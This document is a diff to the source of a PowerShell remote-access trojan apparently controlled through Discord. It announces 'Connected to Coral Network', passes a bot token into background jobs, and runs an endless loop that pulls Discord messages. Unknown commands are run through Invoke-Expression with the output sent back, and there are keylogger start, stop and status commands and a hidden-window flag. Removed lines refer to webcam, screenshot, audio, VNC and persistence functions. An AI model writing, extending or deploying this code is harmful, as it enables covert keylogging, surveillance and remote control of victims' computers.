@@ -6,6 +6,7 @@ $script:Jobs = @{}
 $global:hidewindow = $true
 $global:keyloggerstatus = $false
 $global:lastMessageAttachments = $null
+$global:lastJobCheck = Get-Date
 # =============================== GLOBAL VAR - THEME ==============================
 # You can add more here but gotta install the files yourself ( URL not supported for now )
 # shld add download and stuff
@@ -64,7 +65,7 @@ function DisableTheme{
     $global:theme_enabled = $false
     sendEmbedWithImage -Title "Themes have been disabled" -Description "Use the command `ENABLETHEME` to enable themes."
 }
-# =============================== NEEDED ====================================
+# =============================== GET FFMPEGs ====================================
 
 #ENABLEFFMPEG
 function GetFfmpeg{
@@ -787,19 +788,24 @@ function Get_KeyloggerStatus {
 # =============================== AUDIO (R) ========================================
 #AUDIO
 # =============================== JOB MANAGEMENT FUNCTIONS ===============================
-
-#FIX AGENTS
 function Start_AgentJob {
     param($ScriptString)
     $RandName = -join("ABCDEFGHKLMNPRSTUVWXYZ123456789".ToCharArray()|Get-Random -Count 6)
     
     $job = Start-Job -ScriptBlock {
-        param($ScriptString, $token, $SessionID, $CategoryID)
+        param($ScriptString, $token, $SessionID, $CategoryID, $ModuleRegistry, $themes, $currenttheme, $theme_enabled)
         
         # Set global variables in job scope
         $global:token = $token
         $global:SessionID = $SessionID
         $global:CategoryID = $CategoryID
+        $global:ModuleRegistry = $ModuleRegistry
+        $global:themes = $themes
+        $global:currenttheme = $currenttheme
+        $global:theme_enabled = $theme_enabled
+        $global:hidewindow = $true
+        $global:keyloggerstatus = $false
+        $global:lastMessageAttachments = $null
         
         # Import all necessary functions into job scope
         ${function:Invoke-DiscordAPI} = ${using:function:Invoke-DiscordAPI}
@@ -817,28 +823,11 @@ function Start_AgentJob {
         ${function:GetFfmpeg} = ${using:function:GetFfmpeg}
         ${function:RemoveFfmpeg} = ${using:function:RemoveFfmpeg}
         
-        # Import webcam functions
-        ${function:Awebcam} = ${using:function:Awebcam}
-        
-        # Import screenshot functions
-        ${function:Ascreenshot} = ${using:function:Ascreenshot}
-        
-        # Import audio functions
-        ${function:Aaudio} = ${using:function:Aaudio}
-        
         # Import theme functions
         ${function:GetCurrentTheme} = ${using:function:GetCurrentTheme}
         ${function:SetCurrentTheme} = ${using:function:SetCurrentTheme}
         ${function:EnableTheme} = ${using:function:EnableTheme}
         ${function:DisableTheme} = ${using:function:DisableTheme}
-        
-        # Import other utility functions
-        ${function:AquickInfo} = ${using:function:AquickInfo}
-        ${function:AGetneko} = ${using:function:AGetneko}
-        ${function:ARemoveNeko} = ${using:function:ARemoveNeko}
-        ${function:StartUvnc} = ${using:function:StartUvnc}
-        ${function:RemoveUVNC} = ${using:function:RemoveUVNC}
-        ${function:downloadFile} = ${using:function:downloadFile}
         
         # Import keylogger functions
         ${function:keylogger} = ${using:function:keylogger}
@@ -846,29 +835,100 @@ function Start_AgentJob {
         ${function:Stop_Keylogger} = ${using:function:Stop_Keylogger}
         ${function:Get_KeyloggerStatus} = ${using:function:Get_KeyloggerStatus}
         
-        # Import persistence functions
-        ${function:create_Ptask} = ${using:function:create_Ptask}
-        ${function:remove_Ptask} = ${using:function:remove_Ptask}
+        # Import CRITICAL dynamic loading functions - MUST HAVE
+        ${function:Find_CommandInRegistry} = ${using:function:Find_CommandInRegistry}
+        ${function:Execute_DynamicCommand} = ${using:function:Execute_DynamicCommand}
+        ${function:Execute_DynamicCommandWithParams} = ${using:function:Execute_DynamicCommandWithParams}
+        ${function:Parse_CommandWithParameters} = ${using:function:Parse_CommandWithParameters}
+        ${function:Is_LocalFunction} = ${using:function:Is_LocalFunction}
         
-        # Import global variables that functions might need
-        $global:themes = ${using:global:themes}
-        $global:currenttheme = ${using:global:currenttheme}
-        $global:theme_enabled = ${using:global:theme_enabled}
-        $global:hidewindow = ${using:global:hidewindow}
-        $global:keyloggerstatus = ${using:global:keyloggerstatus}
-        $global:lastMessageAttachments = ${using:global:lastMessageAttachments}
+        # Import utility functions
+        ${function:downloadFile} = ${using:function:downloadFile}
         
-        # Execute the provided script
+        # Define a helper function that mimics the main loop logic for jobs
+        function Execute_JobCommand {
+            param([string]$CommandString)
+            
+            # Parse command with parameters using the same logic as main loop
+            $parsed = Parse_CommandWithParameters -FullCommand $CommandString
+            $command = $parsed.Command.ToUpper()
+            $parameters = $parsed.Parameters
+            
+            # Handle hardcoded commands that might be used in jobs
+            switch ($command) {
+                'GETTHEME' { GetCurrentTheme }
+                'ENABLETHEME' { EnableTheme }
+                'DISABLETHEME' { DisableTheme }
+                'STARTKEYLOG' { 
+                    if ($parameters.ContainsKey("param0") -and $parameters["param0"] -match '^\d+$') {
+                        $interval = [int]$parameters["param0"]
+                        if ($interval -ge 1 -and $interval -le 300) {
+                            Start_Keylogger -intervalSeconds $interval
+                        } else {
+                            sendMsg -Message ":x: **Invalid interval. Use 1-300 seconds**"
+                        }
+                    } else {
+                        Start_Keylogger
+                    }
+                }
+                'STOPKEYLOG' { Stop_Keylogger }
+                'KEYLOGSTATUS' { Get_KeyloggerStatus }
+                default {
+                    if ($command -eq "SETTHEME" -and ($parameters.ContainsKey("param0") -or $parameters.ContainsKey("name"))) {
+                        $themeName = if ($parameters.ContainsKey("name")) { $parameters["name"] } else { $parameters["param0"] }
+                        SetCurrentTheme -themename $themeName
+                    }
+                    else {
+                        # Try to execute as a dynamic command from the registry with parameters
+                        $commandExecuted = Execute_DynamicCommandWithParams -Command $command -Parameters $parameters
+                        
+                        if (-not $commandExecuted) {
+                            # Fall back to PowerShell expression evaluation
+                            try {
+                                $result = Invoke-Expression $CommandString 2>&1
+                                if ($result) {
+                                    $output = $result | Out-String
+                                    sendMsg -Message "``````$output``````"
+                                } else {
+                                    sendMsg -Message "**Command executed successfully (no output)**"
+                                }
+                            } catch {
+                                $errorMsg = $_.Exception.Message
+                                if ($errorMsg.Length -gt 1000) {
+                                    $errorMsg = $errorMsg.Substring(0, 1000) + "... (error truncated)"
+                                }
+                                sendMsg -Message ":x: ``Job Error: $errorMsg`` :x:"
+                            }
+                        }
+                    }
+                }
+            }
+        }
+        
+        # Execute the provided script using the job command handler
         try {
-            Invoke-Expression $ScriptString
+            # Check if the script contains multiple commands separated by semicolon
+            if ($ScriptString -match ';') {
+                $commands = $ScriptString -split ';'
+                foreach ($cmd in $commands) {
+                    $trimmedCmd = $cmd.Trim()
+                    if ($trimmedCmd) {
+                        Execute_JobCommand -CommandString $trimmedCmd
+                        Start-Sleep -Milliseconds 500  # Small delay between commands
+                    }
+                }
+            } else {
+                Execute_JobCommand -CommandString $ScriptString
+            }
         } catch {
+            sendMsg -Message ":x: **Job execution error:** $($_.Exception.Message)"
             Write-Error "Job execution error: $($_.Exception.Message)"
         }
         
-    } -ArgumentList $ScriptString, $global:token, $global:SessionID, $global:CategoryID
+    } -ArgumentList $ScriptString, $global:token, $global:SessionID, $global:CategoryID, $global:ModuleRegistry, $global:themes, $global:currenttheme, $global:theme_enabled
     
     $script:Jobs[$RandName] = $job
-    sendMsg -Message ":gear: **Job Started:** ``$RandName`` | ID: $($job.Id)`n:information_source: **Available functions:** Awebcam, Ascreenshot, Aaudio, AquickInfo, GetCurrentTheme, etc."
+    sendMsg -Message ":gear: **Job Started:** ``$RandName`` | ID: $($job.Id)"
     return $RandName
 }
 
@@ -1708,6 +1768,11 @@ try { sendEmbedWithImage -Title "Connected to Coral Network" -Description "You a
 while ($true) {
     $latestMessage = PullMsg
     
+    $currentTime = Get-Date
+    if (($currentTime - $global:lastJobCheck).TotalSeconds -ge 2) {
+        Check_CompletedJobs
+        $global:lastJobCheck = $currentTime
+    }
     if ($latestMessage -and $latestMessage -ne $previousMessage) {
         $previousMessage = $latestMessage
         
